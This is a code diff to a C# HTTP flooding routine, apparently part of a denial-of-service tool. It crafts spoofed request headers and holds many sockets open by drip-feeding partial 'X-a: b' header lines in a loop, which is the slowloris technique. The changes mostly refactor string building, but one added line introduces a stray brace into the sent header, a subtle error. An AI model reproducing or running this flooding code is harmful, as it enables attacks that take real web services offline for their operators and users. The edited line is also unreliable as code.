@@ -74,7 +74,7 @@ namespace GAS.Core
             {
                 // header set-up
                 byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
-                byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
+                byte[] tbuf = System.Text.Encoding.ASCII.GetBytes("X-a: b{\r\n");
                 States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                 var stop = DateTime.Now;
                 while (IsFlooding)
@@ -103,7 +103,7 @@ namespace GAS.Core
                         if (IsDelayed && (Delay > 0)) System.Threading.Thread.Sleep(Delay);
                     }
                     States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
-                    if (_randcmds) tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", Functions.RandomString(), Environment.NewLine));
+                    if (_randcmds) tbuf = System.Text.Encoding.ASCII.GetBytes("X-a: b"+Functions.RandomString()+"\r\n");
                     for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
                     { // keep the sockets alive
                         try
@@ -128,10 +128,7 @@ namespace GAS.Core
                     if (!IsDelayed) System.Threading.Thread.Sleep(Timeout);
                 }
             }
-            catch
-            {
-                States[MY_INDEX_FOR_WORK] = ReqState.Failed;
-            }
+            catch { States[MY_INDEX_FOR_WORK] = ReqState.Failed; }
             finally
             {
                 IsFlooding = false;
